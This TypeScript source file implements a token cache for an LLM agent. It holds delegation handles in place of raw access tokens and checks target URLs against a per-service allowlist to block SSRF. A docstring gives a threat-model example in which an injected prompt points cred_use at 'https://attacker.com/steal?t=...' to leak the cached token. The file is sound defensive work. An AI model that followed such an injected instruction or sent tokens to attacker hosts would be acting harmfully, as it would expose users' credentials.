/**
 * TokenCache — in-process store for short-lived delegation tokens.
 *
 * Local-mode tokens and remote-mode broker handles are stored here so the LLM
 * never sees a raw access_token. cred_delegate returns a handle (del_xxxx);
 * cred_use exchanges it here or through the Cred server and makes the upstream
 * API call on the LLM's behalf.
 *
 * SSRF protection: isAllowedUrl() validates the target URL against a
 * per-service allowlist so an injected prompt can't redirect the token
 * to an attacker-controlled server. The allowlist itself is a fixed
 * `UrlAllowlistPolicy` instance from @credninja/guard (U2 —
 * docs/plans/2026-08-31-003-feat-guard-mcp-agent-surface-plan.md) — a
 * mandatory security floor independent of whatever CredGuard an operator may
 * separately configure for U1's opt-in tool wrapping. Google's scope-to-
 * endpoint gating and Salesforce's wildcard-subdomain matching used to be
 * hand-rolled here in a second, drift-prone implementation of the same
 * allowlist concept the guard package already models.
 */

import crypto from 'crypto';
import { UrlAllowlistPolicy } from '@credninja/guard';

export interface TokenEntry {
  accessToken?: string;
  serverDelegationId?: string;
  service: string;
  userId: string;
  scopes?: string[];
  brokered?: boolean;
  expiresAt: number; // Unix ms
}

/**
 * Known safe API base URLs per service.
 * cred_use refuses to forward requests to any URL not on this list.
 */
const SERVICE_ALLOWLIST: Record<string, string[]> = {
  google: [
    'https://www.googleapis.com/',
    'https://gmail.googleapis.com/',
    'https://calendar.googleapis.com/',
    'https://drive.googleapis.com/',
    'https://sheets.googleapis.com/',
    'https://docs.googleapis.com/',
    'https://admin.googleapis.com/',
    'https://people.googleapis.com/',
  ],
  github: [
    'https://api.github.com/',
  ],
  slack: [
    'https://slack.com/api/',
  ],
  notion: [
    'https://api.notion.com/',
  ],
};

// Salesforce instance URLs vary per org (e.g. mycompany.salesforce.com) — any
// HTTPS *.salesforce.com or *.force.com origin is allowed, gated by
// UrlAllowlistPolicy's built-in numeric-subdomain (DNS-rebinding) guard.
const WILDCARD_SUBDOMAINS: Record<string, string[]> = {
  salesforce: ['.salesforce.com', '.force.com'],
};

const GOOGLE_SCOPE_ENDPOINTS: Array<{ scopes: string[]; bases: string[] }> = [
  {
    scopes: ['calendar', 'calendar.readonly', 'calendar.events'],
    bases: ['https://www.googleapis.com/calendar/', 'https://calendar.googleapis.com/'],
  },
  {
    scopes: ['gmail.readonly', 'gmail.send', 'gmail.compose', 'gmail.modify', 'mail.google.com'],
    bases: ['https://gmail.googleapis.com/', 'https://www.googleapis.com/gmail/'],
  },
  {
    scopes: ['drive', 'drive.readonly', 'drive.file', 'drive.metadata.readonly'],
    bases: ['https://www.googleapis.com/drive/', 'https://www.googleapis.com/upload/drive/', 'https://drive.googleapis.com/'],
  },
  {
    scopes: ['spreadsheets', 'spreadsheets.readonly'],
    bases: ['https://sheets.googleapis.com/'],
  },
  {
    scopes: ['documents', 'documents.readonly'],
    bases: ['https://docs.googleapis.com/'],
  },
  {
    scopes: ['admin', 'admin.directory.user.readonly', 'admin.directory.group.readonly'],
    bases: ['https://admin.googleapis.com/'],
  },
  {
    scopes: ['openid', 'email', 'profile', 'userinfo.email', 'userinfo.profile'],
    bases: ['https://www.googleapis.com/oauth2/', 'https://openidconnect.googleapis.com/'],
  },
  {
    scopes: ['contacts', 'contacts.readonly'],
    bases: ['https://people.googleapis.com/'],
  },
];

function scopeMatches(grantedScope: string, requiredScope: string): boolean {
  const normalized = grantedScope.toLowerCase().replace(/\/$/, '');
  const required = requiredScope.toLowerCase();
  return normalized === required ||
    normalized.endsWith(`/${required}`) ||
    normalized.endsWith(`auth/${required}`) ||
    normalized.includes(`//${required}`);
}

function isAllowedGoogleScopeEndpoint(normalizedUrl: string, scopes?: string[]): boolean {
  if (!scopes || scopes.length === 0) return false;
  return GOOGLE_SCOPE_ENDPOINTS.some(({ scopes: requiredScopes, bases }) => (
    bases.some((base) => normalizedUrl.startsWith(base)) &&
    requiredScopes.some((requiredScope) => scopes.some((scope) => scopeMatches(scope, requiredScope)))
  ));
}

/**
 * The mandatory SSRF-protection allowlist for cred_use. Distinct from
 * whatever CredGuard an operator may configure for U1's opt-in tool
 * wrapping — this instance always applies, regardless of that configuration,
 * since it protects the raw token forward inside cred_use itself.
 */
const SSRF_ALLOWLIST_POLICY = new UrlAllowlistPolicy({
  allowedUrls: SERVICE_ALLOWLIST,
  wildcardSubdomains: WILDCARD_SUBDOMAINS,
  scopeGate: {
    google: (scopes, targetUrl) => {
      // Match the exact normalization the base-URL check itself uses —
      // hostname + pathname only, no query/fragment — so scope gating sees
      // the same reconstructed URL the allowlist match already validated.
      const parsed = new URL(targetUrl);
      const normalizedUrl = `https://${parsed.hostname.toLowerCase()}${parsed.pathname}`;
      return isAllowedGoogleScopeEndpoint(normalizedUrl, scopes);
    },
  },
});

export class TokenCache {
  private readonly entries = new Map<string, TokenEntry>();
  private cleanupTimer?: ReturnType<typeof setInterval>;

  constructor() {
    // Periodic sweep for expired entries (belt-and-suspenders on top of per-entry timeouts)
    this.cleanupTimer = setInterval(() => this.sweep(), 60_000);
    if (this.cleanupTimer?.unref) this.cleanupTimer.unref();
  }

  /** Store a token and return a delegation handle */
  store(entry: TokenEntry): string {
    const id = `del_${crypto.randomBytes(10).toString('hex')}`;
    this.entries.set(id, { ...entry });

    const ttl = entry.expiresAt - Date.now();
    if (ttl > 0) {
      const t = setTimeout(() => this.entries.delete(id), ttl);
      if (t?.unref) t.unref();
    }

    return id;
  }

  /** Look up a handle. Returns a copy — callers cannot mutate the stored entry. */
  get(id: string): TokenEntry | undefined {
    const entry = this.entries.get(id);
    if (!entry) return undefined;
    if (Date.now() >= entry.expiresAt) {
      this.entries.delete(id);
      return undefined;
    }
    return { ...entry };
  }

  /** Revoke a handle early (e.g. after cred_revoke) */
  delete(id: string): boolean {
    return this.entries.delete(id);
  }

  /**
   * Validate that a URL is safe to forward for the given service.
   *
   * Prevents SSRF: without this check, an injected prompt could craft a
   * cred_use call with url="https://attacker.com/steal?t=..." and the
   * cached token would be sent in the Authorization header.
   *
   * Delegates to the fixed `SSRF_ALLOWLIST_POLICY` (@credninja/guard's
   * `UrlAllowlistPolicy`) instead of re-implementing URL hygiene, base-URL
   * matching, and DNS-rebinding protection here — see U2 in
   * docs/plans/2026-08-31-003-feat-guard-mcp-agent-surface-plan.md.
   */
  isAllowedUrl(service: string, url: string, scopes?: string[]): boolean {
    const result = SSRF_ALLOWLIST_POLICY.evaluate({
      provider: service,
      agentTokenHash: '',
      requestedScopes: scopes ?? [],
      consentedScopes: scopes ?? [],
      timestamp: new Date().toISOString(),
      targetUrl: url,
    });
    return result.decision === 'ALLOW';
  }

  /** Remove all expired entries */
  private sweep(): void {
    const now = Date.now();
    for (const [id, entry] of this.entries) {
      if (now >= entry.expiresAt) this.entries.delete(id);
    }
  }

  destroy(): void {
    if (this.cleanupTimer) clearInterval(this.cleanupTimer);
  }
}
